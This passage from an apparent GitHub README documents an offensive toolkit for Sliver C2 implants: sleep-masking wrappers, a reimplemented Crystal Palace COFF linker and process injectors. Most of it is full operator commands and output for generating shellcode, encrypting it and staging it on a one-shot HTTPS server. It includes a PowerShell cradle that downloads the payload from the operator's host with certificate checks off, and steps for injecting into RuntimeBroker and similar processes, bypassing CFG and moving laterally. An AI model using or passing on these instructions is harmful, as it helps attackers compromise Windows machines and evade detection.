`kernel32!Sleep` normally forwards to `KernelBase!Sleep`. SleepKit captures `KernelBase!Sleep`'s address before hooking, then calls it directly inside the hook handler — avoiding an infinite loop into its own hook.

### 3.4 Choosing Between MaskKit and SleepKit

[Permalink: 3.4 Choosing Between MaskKit and SleepKit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#34-choosing-between-maskkit-and-sleepkit)

| Question | MaskKit | SleepKit |
| --- | --- | --- |
| Need a raw shellcode to inject? | ✅ Yes | ❌ No — produces EXE |
| Need a standalone EXE? | ❌ No | ✅ Yes |
| Want to chain with Crystal Palace Kit? | ✅ Yes — wrap MaskKit output | ⚠️ Possible but adds complexity |
| Need stack spoofing? | ✅ Yes | ❌ No |
| Simplest possible build? | Moderate | ✅ Yes |
| Pure C payload, no Go runtime in shellcode? | ✅ Yes | ❌ Go binary |
| Timer-based backup masking loop? | ❌ Hook-only | ✅ Yes |

### 3.5 Full Usage — MaskKit

[Permalink: 3.5 Full Usage — MaskKit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#35-full-usage--maskkit)

#### 3.5.1 Generate a Sliver Shellcode

[Permalink: 3.5.1 Generate a Sliver Shellcode](https://github.com/Squ1shification/SliverC2-Evasion-Suite#351-generate-a-sliver-shellcode)

```
# Start the listener
sliver > mtls --lport 8888

# Generate the implant as raw shellcode (NOT --format shared)
sliver > generate \
    --format shellcode \
    --os windows \
    --arch amd64 \
    --mtls 192.162.1.10 \
    --sleep 60s \
    --jitter 10 \
    --save implant.bin
```

The masking threshold defaults to 5000ms. Any wait ≥ 5s triggers masking, so the 60s C2 sleep is caught while goroutine-internal waits (typically <100ms) are ignored.

#### 3.5.2 Wrap with MaskKit

[Permalink: 3.5.2 Wrap with MaskKit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#352-wrap-with-maskkit)

```
cd Sleep-Mask-Kit/maskkit

./maskkit wrap \
    --shellcode implant.bin \
    --threshold 5000 \
    --output build/masked.bin
```

```
[*] Shellcode: 589824 bytes
[*] Masker shellcode: 3472 bytes
[+] Payload: 593384 bytes → build/masked.bin
[+] Key: df41c021afc61efe5945c964a77d9b51f9ae1be85bfd2494e7ffd4f0e8b47321
[+] Threshold: 5000 ms (waits > 5s trigger masking)
```

Or compile-and-wrap in one shot (recompiles the C masker objects if they are missing or stale):

```
./maskkit make \
    --shellcode implant.bin \
    --threshold 5000 \
    --output build/masked.bin
```

#### 3.5.3 Serve the Payload

[Permalink: 3.5.3 Serve the Payload](https://github.com/Squ1shification/SliverC2-Evasion-Suite#353-serve-the-payload)

```
./maskkit serve --payload build/masked.bin --port 8443

[*] Serving 593384 bytes on https://0.0.0.0:8443/3fa29c1d8e7b04a2
```

#### 3.5.4 Deliver and Execute

[Permalink: 3.5.4 Deliver and Execute](https://github.com/Squ1shification/SliverC2-Evasion-Suite#354-deliver-and-execute)

`masked.bin` is a flat PIC shellcode — deliver it via any injector or chain it through PalaceKit for an additional Crystal Kit loader wrapper. A minimal PowerShell cradle:

```
# Download (target side)
$wc = New-Object System.Net.WebClient
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$sc = $wc.DownloadData("https://192.162.1.10:8443/3fa29c1d8e7b04a2")
# Pass $sc into your preferred injector

# Or chain through PalaceKit for the full stack
cd Crystal-Palace-Kit/palacekit
./palacekit build \
    --shellcode Sleep-Mask-Kit/maskkit/build/masked.bin \
    --spec loader/loader.spec \
    --output build/palace_masked.bin
```

#### 3.5.5 Threshold Tuning

[Permalink: 3.5.5 Threshold Tuning](https://github.com/Squ1shification/SliverC2-Evasion-Suite#355-threshold-tuning)

```
# Conservative — only catch very long sleeps
./maskkit wrap --shellcode implant.bin --threshold 10000   # 10 seconds

# Aggressive — catch anything over ~2 seconds
./maskkit wrap --shellcode implant.bin --threshold 2000    # 2 seconds
```

Go runtime waits are typically under 100ms, so even 2000ms is safe from false positives. If your Sliver sleep is set very short (e.g. `--sleep 3s`), drop the threshold below it so masking still fires.

#### 3.5.6 MaskKit Command Reference

[Permalink: 3.5.6 MaskKit Command Reference](https://github.com/Squ1shification/SliverC2-Evasion-Suite#356-maskkit-command-reference)

| Command | Flags | Purpose |
| --- | --- | --- |
| `maskkit wrap` | `--shellcode`, `--threshold`, `--interval`, `--key`, `--bin-dir`, `--output` | Assemble already-compiled masker objects + Sliver shellcode into `masked.bin` |
| `maskkit make` | same as `wrap` | Compile masker C sources first, then wrap |
| `maskkit serve` | `--payload`, `--port` | One-shot HTTPS server for the masked payload |
| `maskkit gen-hashes` | — | Print ROR13 hashes — verify against `#define H_*` in `services.c` |

### 3.6 Full Usage — SleepKit

[Permalink: 3.6 Full Usage — SleepKit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#36-full-usage--sleepkit)

#### 3.6.1 Build the Masked EXE

[Permalink: 3.6.1 Build the Masked EXE](https://github.com/Squ1shification/SliverC2-Evasion-Suite#361-build-the-masked-exe)

```
cd Sleep-Mask-Kit/sleepkit

./sleepkit build \
    --shellcode implant.bin \
    --url https://192.162.1.10:8443 \
    --sleep 30s \
    --serve

# SleepKit is pure Go and does not require mingw-w64.
# --url only needs the scheme and host:port — the random path is baked into mask.exe at build time.
```

```
[+] payload  → build/payload.enc
[+] mask.exe → build/mask.exe
[+] sleep    → 30s (30000 ms)
[*] One-shot HTTPS server on :8443 — shuts down after one download
[+] Staging URL: https://192.162.1.10:8443/a3f91c04b2e8d17f
    (random path — baked into mask.exe, only this URL works)
[i] Deliver mask.exe to target. It fetches shellcode and runs with sleep masking.
```

The build step ChaCha20-Poly1305-encrypts the shellcode with a random key and nonce, cross-compiles `mask.exe` for Windows x64 with the key, nonce, and full staging URL baked in via `-ldflags`, and starts the one-shot HTTPS server. SleepKit uses pure Go cross-compilation (CGO\_ENABLED=0) and does not need mingw-w64.

#### 3.6.2 Deliver and Execute mask.exe

[Permalink: 3.6.2 Deliver and Execute mask.exe](https://github.com/Squ1shification/SliverC2-Evasion-Suite#362-deliver-and-execute-maskexe)

Transfer `build/mask.exe` to the target by any method and run it. On execution it:

1. Downloads `payload.enc` from the baked-in staging URL via Go `net/http` (InsecureSkipVerify; self-signed certs are fine)
2. Decrypts with ChaCha20-Poly1305 and the embedded key — exits immediately if the auth tag fails (tamper detection at no extra cost)
3. `NtAllocateVirtualMemory(PAGE_READWRITE)` → copy → `NtProtectVirtualMemory(PAGE_EXECUTE_READ)`
4. Installs the `kernel32!Sleep` JMP hook
5. Starts the timer goroutine (masks every `--sleep` interval regardless of Sleep calls)
6. `NtCreateThreadEx` on the Sliver shellcode entry
7. The HTTPS server shuts down; the staging URL is dead

#### 3.6.3 Serving a Pre-Built Payload

[Permalink: 3.6.3 Serving a Pre-Built Payload](https://github.com/Squ1shification/SliverC2-Evasion-Suite#363-serving-a-pre-built-payload)

```
./sleepkit serve --payload build/payload.enc --port 8443
```

The ChaCha20-Poly1305 key and nonce for SleepKit are baked into `mask.exe` at build time. **Do not** reuse `payload.enc` with a different `mask.exe` — each build generates a matched pair. If you rebuild the EXE, a new `payload.enc` is generated with a new key.

#### 3.6.4 SleepKit Command Reference

[Permalink: 3.6.4 SleepKit Command Reference](https://github.com/Squ1shification/SliverC2-Evasion-Suite#364-sleepkit-command-reference)

| Command | Flags | Purpose |
| --- | --- | --- |
| `sleepkit build` | `--shellcode`, `--url`, `--sleep`, `--serve`, `--output` | Build the masked Windows EXE; optionally start server |
| `sleepkit serve` | `--payload`, `--port` | Serve an already-built `payload.enc` once over HTTPS |

* * *

## 4\. Crystal Palace Kit

[Permalink: 4. Crystal Palace Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#4-crystal-palace-kit)

Crystal Palace is a closed-source Java application (`crystalpalace.jar`) for Cobalt Strike operators — a COFF linker with a custom DSL that turns C source files plus `.spec` config into Position-Independent Code (PIC) shellcode blobs with no PE headers and no Import Address Table. Crystal Palace Kit reimplements that linker in Go and pairs it with a Sliver-specific operator workflow.

### 4.1 PalaceKit — The Free Replacement Linker

[Permalink: 4.1 PalaceKit — The Free Replacement Linker](https://github.com/Squ1shification/SliverC2-Evasion-Suite#41-palacekit--the-free-replacement-linker)

PalaceKit is a Go application that does what `crystalpalace.jar` does:

1. Parses AMD64 COFF `.o` files produced by mingw-gcc
2. Merges multiple COFF objects into a single code image
3. Applies all relocations (REL32, ADDR64, etc.) at link time
4. Evaluates a Crystal Kit `.spec` file (the DSL)
5. Fills named COFF sections (`dll`, `mask`, `nonce`, `pico`) with runtime data
6. Implements Crystal Palace's **DFR (Dynamic Function Resolution)** system — `attach` rewrites unresolved `MODULE$FUNC` externs to local hooks at link time, `preserve` scopes exemptions by containing function, and unattached DFR symbols get a generated PEB-resolver thunk that calls `patch_resolve(ror13_hash)` at runtime
7. Emits a runtime hook table from `addhook` directives that the PICO's `__resolve_hook` intrinsic consults
8. Outputs a flat PIC shellcode blob

What it does _not_ need: Java, the `libtcg.x64.zip` TCG runtime, or the Crystal Palace distribution itself.

### 4.2 The COFF Linking Process

[Permalink: 4.2 The COFF Linking Process](https://github.com/Squ1shification/SliverC2-Evasion-Suite#42-the-coff-linking-process)

A COFF object from `x86_64-w64-mingw32-gcc -c` contains sections (`.text`, `.rdata`, `.data`), a symbol table, and a list of relocations. A typical relocation says: _"at offset 0x42 in `.text`, write the 32-bit relative address of the symbol `resolve_all`."_

PalaceKit's linker maintains three accumulation buffers and, for each COFF object merged:

- Appends each section's data, recording the base offset
- Registers all symbols with their new section + offset
- Applies each relocation against the merged image

The most common type, **REL32**, computes `target_offset - (source_offset + 4)` — the PC-relative offset the CPU adds to the instruction pointer at runtime.

If `+gofirst` was specified, after merging the linker finds the `go` symbol in `.text` and rotates the entire code buffer so `go` lands at byte offset 0. The shellcode's natural entry point is the very first byte — no entry stub needed.

### 4.3 Named Sections and the GETRESOURCE Pattern

[Permalink: 4.3 Named Sections and the GETRESOURCE Pattern](https://github.com/Squ1shification/SliverC2-Evasion-Suite#43-named-sections-and-the-getresource-pattern)

The C loader source declares zero-length symbols in named sections as placeholders:

```
char _DLL_[0]  __attribute__((section("dll")));
char _MASK_[0] __attribute__((section("mask")));
char _PICO_[0] __attribute__((section("pico")));
```

PalaceKit _fills_ these sections from the `.spec` directives. At runtime, `GETRESOURCE(_DLL_)` expands to `(char *)&_DLL_`, which points to a `RESOURCE` struct:

```
typedef struct {
    uint32_t len;       // length of the data
    uint8_t  value[];   // the data bytes
} RESOURCE;
```

So when `go()` runs, the encrypted Sliver shellcode and the XOR key are read directly from the loader's own memory — no file I/O, no network request, no separate stage.

### 4.4 The Spec DSL

[Permalink: 4.4 The Spec DSL](https://github.com/Squ1shification/SliverC2-Evasion-Suite#44-the-spec-dsl)

The C loader uses Crystal Palace's **DFR convention**: API calls are written as `NTDLL$NtAllocateVirtualMemory(...)`, which compiles to an unresolved external. PalaceKit resolves these at link time either to a local hook (via `attach`) or to a generated PEB-resolver thunk that calls `patch_resolve(ror13_hash)` at runtime. The C sources are still compiled as a **unity build** (`unity.c` includes every loader source into one TU) which keeps cross-TU references local and avoids MinGW's `.refptr` / `ADDR64` indirections.

```
x64:
    load "bin/loader.x64.o"
        make pic +gofirst +optimize
        # unity build: loader.c + services.c + all stubs compiled via unity.c
        # +optimize is a Crystal Palace hint; PalaceKit accepts and ignores it

    ; ── DFR rewriting (optional) ──────────────────────────────────────
    attach   "NTDLL$NtAllocateVirtualMemory" "_HookedNtAllocateVirtualMemory"
    preserve "NTDLL$NtAllocateVirtualMemory" "_HookedNtAllocateVirtualMemory"
    ;   attach   → all callsites of the DFR symbol redirect to _Hooked…
    ;   preserve → the hook's own forward-call uses the default thunk
    ;              instead of looping back into itself

    ; ── Encryption choice ─────────────────────────────────────────────
    ; XOR (default — small, no auth):
    generate $MASK 128
    push $DLL
        xor $MASK
        preplen
        link "dll"
    push $MASK
        preplen
        link "mask"

    ; ChaCha20 (stronger, defeats brute-force on the embedded blob):
    ;   generate $KEY   32
    ;   generate $NONCE 12
    ;   push $DLL
    ;       chacha20 $KEY $NONCE
    ;       preplen
    ;       link "dll"
    ;   push $KEY    preplen   link "mask"
    ;   push $NONCE  preplen   link "nonce"

    run "pico.spec"
        link "pico"

    export
```

| Directive | Effect |
| --- | --- |
| `load "f.o"` \+ `make pic +gofirst` | Parse COFF, merge into image, rotate so `go` is at offset 0 |
| `merge` | Append a COFF without rotation |
| `attach "EXT" "_local"` | **DFR rewrite.** Any unresolved `MODULE$FUNC` external matching `EXT` is resolved to the local hook symbol `_local` at link time. Crystal Palace's headline feature, now functional. |
| `preserve "EXT" "fn"` | Scope exemption: calls to `EXT` originating inside function `fn` bypass the `attach` redirect and use the default PEB-resolver thunk instead. Lets the hook reach the real API. |
| `addhook "EXT" "_local"` | Append a `{ror13(EXT), _local}` entry to the PICO's runtime hash table. The PICO's `__resolve_hook(hash)` intrinsic walks the table for dispatch-time hooking. |
| `generate $VAR N` | N cryptographically random bytes → `$VAR` |
| `push $VAR` | Push variable bytes onto the processing stack |
| `xor $MASK` | XOR-encrypt top of stack with key bytes (cycles) |
| `chacha20 $KEY $NONCE` | **New.** ChaCha20-IETF stream cipher on top of stack. `$KEY` must be 32 bytes, `$NONCE` must be 12 bytes. Output length equals input length; loader detects ChaCha20 mode by the presence of a `nonce` named section. |
| `preplen` | Prepend uint32 little-endian length → forms a RESOURCE |
| `link "name"` | Pop stack → store as named COFF section (`dll`, `mask`, `nonce`, or `pico`) |
| `run "sub.spec"` | Evaluate sub-spec, push its output blob |
| `exportfunc "f" "__tag_f"` | Assign a numeric tag ID for PICO export |
| `export` | End of spec — triggers final assembly |

### 4.5 DFR and the PICO Hash Table

[Permalink: 4.5 DFR and the PICO Hash Table](https://github.com/Squ1shification/SliverC2-Evasion-Suite#45-dfr-and-the-pico-hash-table)

Crystal Palace's defining feature is the **DFR** (Dynamic Function Resolution) system. PalaceKit now implements it end-to-end:

| Stage | Mechanism |
| --- | --- |
| 1\. Author the C | Call APIs using the `MODULE$FUNCTION` convention — e.g. `NTDLL$NtAllocateVirtualMemory(...)`. mingw emits an unresolved external symbol with a REL32 relocation at each callsite. |
| 2\. Spec directive | An `attach "NTDLL$NtAllocateVirtualMemory" "_HookedNtAllocateVirtualMemory"` line records the redirect. |
| 3\. Linker resolution | During `Finish()`, PalaceKit walks pending relocations: each unresolved DFR external with an attach maps to the local hook's offset; the rest get a freshly-emitted 22-byte thunk appended to `.text` that calls `patch_resolve(ror13_hash)` and tail-jumps to the resolved API. |
| 4\. Preserve exemption | For each pending reloc inside a preserved containing function, the attach rewrite is bypassed and the thunk is used instead. This lets the hook's own forward-call reach the real API without infinite recursion. |
| 5\. Runtime | The default thunk has no cache — every call walks the PEB. Per-call cost is ~3 ms; replace with a cached variant if hot loops use DFR. |

`addhook` populates a separate runtime table embedded at the end of the PICO blob:

```
PICO blob v2:
  [4]  total_size
  [4]  num_exports
  [4]  num_hooks
  [4]  hooks_table_offset
  [num_exports × {[4]tag [4]code_offset}]
  [code bytes]
  [num_hooks × {[4]ror13_hash [4]hook_code_offset}]   ← addhook table
```

The PICO's `__resolve_hook(uint32_t hash)` intrinsic walks this table and returns the matching hook pointer, or NULL. Operators wire it to a custom `GetProcAddress`-style proxy that consults the table before falling through to the real API resolver. The default Sliver loader doesn't need this (Beacon-style IAT hooking is unsafe under the Go runtime — see below), but the machinery is in place for downstream components that do.

#### 4.5.1 Stubbed File Rationale

[Permalink: 4.5.1 Stubbed File Rationale](https://github.com/Squ1shification/SliverC2-Evasion-Suite#451-stubbed-file-rationale)

Three Crystal Kit C files remain stubs for the Sliver loader because the Go runtime makes the original techniques unsafe. The DFR machinery is independent of these — `attach`/`preserve`/`addhook` all work even with the stubbed files:

| File | CS purpose | Disabled because |
| --- | --- | --- |
| `hooks.c` | IAT hooks inside Beacon | Go scheduler preempts every 10ms; hook state corrupted between preemptions. (DFR-style `attach` hooks are _not_ affected — they're link-time symbol rewrites, no IAT poking.) |
| `mask.c` | Sleep mask Beacon's own memory | Goroutines run during XOR → read encrypted code → crash. **Replaced by Sleep Mask Kit** |
| `spoof.c` | Stack spoof during sleep | Go's runtime manages stacks; spoofing breaks the unwinder and GC |

### 4.6 CrystalKit — Operator Workflow

[Permalink: 4.6 CrystalKit — Operator Workflow](https://github.com/Squ1shification/SliverC2-Evasion-Suite#46-crystalkit--operator-workflow)

CrystalKit is the operator-side tool built around the linker. Its primary workflow is a process injector that doesn't need PalaceKit or Crystal Palace at all:

```
Generate Sliver shellcode (.bin)
       │
       ▼
crystalkit inject
  • ChaCha20-Poly1305 encrypt (upgrade from CrystalSliver's AES-CBC)
  • Cross-compile Go stager with key+nonce+URL baked in (mingw-w64)
  • Optional: garble for symbol obfuscation
  • One-shot HTTPS server (self-signed ECDSA P-256, dies after 1 fetch)
       │
       ▼
Deliver loader.exe to target
  • Fetch payload.enc via Go net/http (InsecureSkipVerify; self-signed certs are fine)
  • ChaCha20-Poly1305 decrypt (exits if tampered — auth tag check)
  • Find a host process: RuntimeBroker.exe → SgrmBroker.exe →
    WerFault.exe → dllhost.exe → spawn notepad.exe suspended
  • NtAllocateVirtualMemory(host, RW)
  • NtWriteVirtualMemory(host)
  • NtProtectVirtualMemory(host, RX)                    ← no RWX
  • NtCreateThreadEx(host, shellcode_entry)
  • Loader process exits cleanly — Sliver lives in the host process
       │
       ▼
Sliver callbacks to C2
```

### 4.7 The Full Crystal Palace PICO Implant

[Permalink: 4.7 The Full Crystal Palace PICO Implant](https://github.com/Squ1shification/SliverC2-Evasion-Suite#47-the-full-crystal-palace-pico-implant)

```
crystalkit implant
       │
       │  (uses PalaceKit or crystalpalace.jar)
       ▼
PalaceKit build
  • Unity build: unity.c compiles all main C sources into loader.x64.o
  • 5 stub objects: pico, hooks, spoof, cfg, cleanup (6 COFF objects total)
  • Process loader.spec through COFF linker
  • Embed XOR'd shellcode in "dll" section
  • Build PICO blob (two no-op stubs) for "pico" section
  • Output: palace.bin (standalone ~4 KB PIC shellcode)
       │
       ▼
Deliver palace.bin via any method (or chain through MaskKit/SleepKit first)
  • go() entry at offset 0 — no relocation, no PE loader
  • Every API call goes through a DFR thunk (per-call PEB walk via patch_resolve)
    or a directly-attached local hook — no runtime resolve_all() needed
  • PICO setup: pico_set_bases() makes the embedded hash table visible to
    __resolve_hook(hash) for any post-load runtime dispatch
  • XOR or ChaCha20 decrypt Sliver shellcode from "dll" section (mode chosen
    by presence of a "nonce" section)
  • Allocate RW → copy → mark RX → NtCreateThreadEx
```

### 4.8 C Source Files at a Glance

[Permalink: 4.8 C Source Files at a Glance](https://github.com/Squ1shification/SliverC2-Evasion-Suite#48-c-source-files-at-a-glance)

| File | Role |
| --- | --- |
| `loader.c` | Entry point `go()`: DFR-call APIs, set up PICO, decrypt shellcode (XOR or ChaCha20), `NtCreateThreadEx` |
| `services.c` | ROR13 PEB walk (`patch_resolve`) called by every DFR thunk PalaceKit emits |
| `pico.c` | PICO runtime: `PicoLoad`, `PicoGetExport`, and `__resolve_hook(hash)` intrinsic that walks the embedded addhook table |
| `hooks.c` | Sample DFR hook (`_HookedNtAllocateVirtualMemory`) demonstrating `attach`/`preserve` end-to-end. Operators replace the body with real evasion logic. |
| `cfg.c` | CFG bypass via `SetProcessValidCallTargets` — registers PICO region as valid |
| `cleanup.c` | Zero the shellcode region before `NtFreeVirtualMemory` — forensic noise reduction |
| `mask.c` / `spoof.c` | Stubs — see 4.5.1 |

### 4.9 Full Usage — PalaceKit

[Permalink: 4.9 Full Usage — PalaceKit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#49-full-usage--palacekit)

#### 4.9.1 Generate the Sliver Shellcode

[Permalink: 4.9.1 Generate the Sliver Shellcode](https://github.com/Squ1shification/SliverC2-Evasion-Suite#491-generate-the-sliver-shellcode)

```
sliver > generate \
    --format shellcode \
    --os windows \
    --arch amd64 \
    --mtls 192.162.1.10 \
    --save implant.bin
```

**Critical:** always use `--format shellcode`, not `--format shared`. A shared DLL would start a second Go runtime inside the host process, which conflicts with anything that already has one running.

#### 4.9.2 Build the PIC Loader

[Permalink: 4.9.2 Build the PIC Loader](https://github.com/Squ1shification/SliverC2-Evasion-Suite#492-build-the-pic-loader)

```
cd Crystal-Palace-Kit/palacekit

./palacekit build \
    --shellcode implant.bin \
    --spec loader/loader.spec \
    --output build/palace.bin
```

```
[*] Shellcode: 589824 bytes
[+] Loader: 595943 bytes → build/palace.bin
```

The build runs the full pipeline: evaluate `loader.spec`, merge the 6 COFF loader objects, resolve every unresolved `MODULE$FUNC` external (attach → local hook, or default → emit a 22-byte PEB-resolver thunk), apply `+gofirst` rotation, generate a fresh 128-byte XOR key (or 32-byte ChaCha20 key + 12-byte nonce), encrypt the Sliver shellcode and embed it in the `dll` section, assemble the PICO blob with its addhook hash table, and emit a flat ~6 KB PIC shellcode that wraps the implant.

Verbose mode (`-v`) prints every DFR decision so you can verify `attach`/`preserve` are wiring correctly:

```
$ ./palacekit build --shellcode implant.bin --spec loader/loader.spec -v
[*] Shellcode: 589824 bytes
[dfr] NTDLL$NtAllocateVirtualMemory @ _HookedNtAllocateVirtualMemory → thunk (preserved)
[dfr] NTDLL$NtProtectVirtualMemory @ go → thunk
[dfr] NTDLL$NtAllocateVirtualMemory @ go → attach _HookedNtAllocateVirtualMemory
[dfr] NTDLL$NtAllocateVirtualMemory @ go → attach _HookedNtAllocateVirtualMemory
[dfr] NTDLL$NtCreateThreadEx @ go → thunk
[dfr] NTDLL$NtWaitForSingleObject @ go → thunk
[dfr] NTDLL$NtFreeVirtualMemory @ go → thunk
[dfr] KERNEL32$LoadLibraryA @ go → thunk
[pico] buildPICO: 2 exports, 3 hooks
[+] Loader: 595943 bytes → build/palace.bin
```

#### 4.9.3 Compile-and-Build in One Command

[Permalink: 4.9.3 Compile-and-Build in One Command](https://github.com/Squ1shification/SliverC2-Evasion-Suite#493-compile-and-build-in-one-command)

```
./palacekit make-loader \
    --shellcode implant.bin \
    --output build/palace.bin
```

This recompiles all C loader objects with mingw-w64 via the unity build before linking. Use this on a fresh checkout or after editing any C source.

#### 4.9.4 Serve and Deliver

[Permalink: 4.9.4 Serve and Deliver](https://github.com/Squ1shification/SliverC2-Evasion-Suite#494-serve-and-deliver)

```
./palacekit serve --payload build/palace.bin --port 8443

[*] Serving 4218 bytes on https://0.0.0.0:8443/a3f91c04b2e8d17f
```

Deliver `palace.bin` via any execution method. On run: `go()` at offset 0 executes (PIC, no relocation), all APIs resolve via ROR13 PEB walk, the Sliver shellcode is XOR-decrypted from the embedded `dll` section, `NtCreateThreadEx` starts it, and the session calls back.

#### 4.9.5 Verify ROR13 Hashes

[Permalink: 4.9.5 Verify ROR13 Hashes](https://github.com/Squ1shification/SliverC2-Evasion-Suite#495-verify-ror13-hashes)

```
./palacekit gen-hashes

NtAllocateVirtualMemory      0xD33BCABD
NtProtectVirtualMemory       0x8C394D89
NtCreateThreadEx             0x4D1DEB74
NtWaitForSingleObject        0xAE06C1B2
NtFreeVirtualMemory          0xDB63B5AB
RtlExitUserThread            0xFF7F061A
VirtualAlloc                 0x91AFCA54
VirtualProtect               0x7946C61B
VirtualFree                  0x030633AC
LoadLibraryA                 0xEC0E4E8E
GetProcAddress               0x7C0DFCAA
LoadLibraryW                 0xEC0E4EA4
ExitThread                   0x60E0CEEF
```

If you modify `services.c` or add a new API, run this and update the `#define H_*` constants in `src/services.c` to match.

#### 4.9.6 PalaceKit Command Reference

[Permalink: 4.9.6 PalaceKit Command Reference](https://github.com/Squ1shification/SliverC2-Evasion-Suite#496-palacekit-command-reference)

| Command | Flags | Purpose |
| --- | --- | --- |
| `palacekit build` | `--shellcode`, `--spec`, `--output`, `--verbose` | Process spec + COFF objects, emit PIC blob |
| `palacekit make-loader` | `--shellcode`, `--output` | Recompile C objects then build (one shot) |
| `palacekit serve` | `--payload`, `--port` | One-shot HTTPS server for the PIC blob |
| `palacekit gen-hashes` | — | Print ROR13 hashes for the resolver constants |
| `palacekit xor-wrap` | `--input`, `--output`, `--key` | Manually XOR-encrypt a file (debugging helper) |

### 4.10 Full Usage — CrystalKit

[Permalink: 4.10 Full Usage — CrystalKit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#410-full-usage--crystalkit)

#### 4.10.1 Process Injector Workflow (No Crystal Palace Needed)

[Permalink: 4.10.1 Process Injector Workflow (No Crystal Palace Needed)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#4101-process-injector-workflow-no-crystal-palace-needed)

The primary CrystalKit workflow is a self-contained process injector and doesn't need PalaceKit or Crystal Palace at all. It encrypts with ChaCha20-Poly1305, cross-compiles a Go stager with key + URL baked in, and injects into a chosen host process on target.

```
cd Crystal-Palace-Kit/crystalkit

./crystalkit inject \
    --shellcode implant.bin \
    --url https://192.162.1.10:8443 \
    --output build/ \
    --garble \
    --serve
```

```
[+] payload     → build/payload.enc
[+] loader.exe  → build/loader.exe
[*] One-shot HTTPS server on :8443 — shuts down after one download
[+] Staging URL: https://192.162.1.10:8443/a3f91c04b2e8d17f
    (random path baked into loader.exe — only this URL works)
```

Deliver `loader.exe`. On execution it:

1. Fetches `payload.enc` via Go net/http (InsecureSkipVerify; self-signed certs are fine)
2. Decrypts with ChaCha20-Poly1305 — exits silently if the auth tag doesn't match (tamper detection)
3. Searches for a host: `RuntimeBroker.exe` → `SgrmBroker.exe` → `WerFault.exe` → `dllhost.exe` → spawn `notepad.exe` suspended
4. `NtAllocateVirtualMemory(host, PAGE_READWRITE)` → `NtWriteVirtualMemory(host)` → `NtProtectVirtualMemory(host, PAGE_EXECUTE_READ)`
5. `NtCreateThreadEx` on the host process at the shellcode entry
6. Loader process exits cleanly — Sliver now lives in the host

#### 4.10.2 Crystal Palace PICO Implant Workflow

[Permalink: 4.10.2 Crystal Palace PICO Implant Workflow](https://github.com/Squ1shification/SliverC2-Evasion-Suite#4102-crystal-palace-pico-implant-workflow)

For the full Crystal Palace loader experience, route the shellcode through PalaceKit (or `crystalpalace.jar` if you have it) before staging:

```
./crystalkit implant \
    --shellcode implant.bin \
    --url https://192.162.1.10:8443 \
    --serve
```

This invokes PalaceKit to build the COFF-linked PIC shellcode, then stages it via the same one-shot HTTPS server CrystalKit uses for the inject workflow.

#### 4.10.3 Wrap a Post-Ex DLL in the PICO Format

[Permalink: 4.10.3 Wrap a Post-Ex DLL in the PICO Format](https://github.com/Squ1shification/SliverC2-Evasion-Suite#4103-wrap-a-post-ex-dll-in-the-pico-format)

```
./crystalkit postex \
    --dll target.dll \
    --output build/postex.pico
```

Use this to convert a post-exploitation DLL into the PICO format so it can be dispatched through Crystal Palace's tag-based execution. Requires either Crystal Palace or PalaceKit.

#### 4.10.4 Stage Existing Payloads

[Permalink: 4.10.4 Stage Existing Payloads](https://github.com/Squ1shification/SliverC2-Evasion-Suite#4104-stage-existing-payloads)

```
./crystalkit serve \
    --payload build/payload.enc \
    --port 8443
```

Restart the one-shot server for a previously-built `payload.enc` — for example, after the original server shut down because the first fetch failed.

#### 4.10.5 Build & Bundle Sliver Extensions

[Permalink: 4.10.5 Build & Bundle Sliver Extensions](https://github.com/Squ1shification/SliverC2-Evasion-Suite#4105-build--bundle-sliver-extensions)

```
./crystalkit build-ext     # cross-compile any C extensions in the repo
./crystalkit bundle        # package them into Sliver extension tarballs
```

#### 4.10.6 CrystalKit Command Reference

[Permalink: 4.10.6 CrystalKit Command Reference](https://github.com/Squ1shification/SliverC2-Evasion-Suite#4106-crystalkit-command-reference)

| Command | Flags | Purpose |
| --- | --- | --- |
| `crystalkit inject` | `--shellcode`, `--url`, `--output`, `--garble`, `--serve` | Build ChaCha20-Poly1305 staged process injector (no Crystal Palace needed) |
| `crystalkit implant` | `--shellcode`, `--url`, `--serve` | Build the full Crystal Palace PICO loader (uses PalaceKit) |
| `crystalkit postex` | `--dll`, `--output` | Wrap a post-ex DLL in PICO format |
| `crystalkit serve` | `--payload`, `--port` | Restart the one-shot HTTPS server for an existing payload |
| `crystalkit build-ext` | — | Build all C-based Sliver extensions in the repo |
| `crystalkit bundle` | — | Package built extensions into Sliver tarballs |

#### 4.10.7 Environment Setup for Crystal Palace Features

[Permalink: 4.10.7 Environment Setup for Crystal Palace Features](https://github.com/Squ1shification/SliverC2-Evasion-Suite#4107-environment-setup-for-crystal-palace-features)

If you have access to Crystal Palace and want CrystalKit to use it instead of PalaceKit:

```
cp .crystalenv.example .crystalenv
# Edit:
#   CRYSTAL_PALACE_HOME=/path/to/crystal-palace
#   SLIVER_SERVER=/path/to/sliver-server   # optional
```

The primary `crystalkit inject` workflow does not need this. Only the `implant` and `postex` commands route through Crystal Palace / PalaceKit.

* * *

## 5\. Inject Kit

[Permalink: 5. Inject Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#5-inject-kit)

Inject Kit solves two problems in one package: moving your shellcode into a legitimate Windows process, and making that process look like it was spawned by the right parent. It works whether you have a Sliver session or not.

There are three separate binaries and it's important to know which one runs where:

### 5.1 Three Components

[Permalink: 5.1 Three Components](https://github.com/Squ1shification/SliverC2-Evasion-Suite#51-three-components)

| Binary | Runs on | What it does |
| --- | --- | --- |
| `injectkit` | Operator machine (Linux) | Encrypts your shellcode, writes `payload.enc`, starts the one-shot staging server. Never touches Windows. |
| `injectkit.exe` | Target machine (Windows) | Standalone EXE. No Sliver session needed. Fetches shellcode from your staging server, injects into a process, exits cleanly. This is your initial access delivery. |
| `inject.x64.dll` | Target machine, inside a Sliver session | Sliver Extension. Installed exactly like LoadKit. You call `inject url=... key=... spawn=RuntimeBroker.exe` from the Sliver console and it injects into a second process from within the active session. Lateral movement and session redundancy. |

### 5.2 Staging Overview

[Permalink: 5.2 Staging Overview](https://github.com/Squ1shification/SliverC2-Evasion-Suite#52-staging-overview)

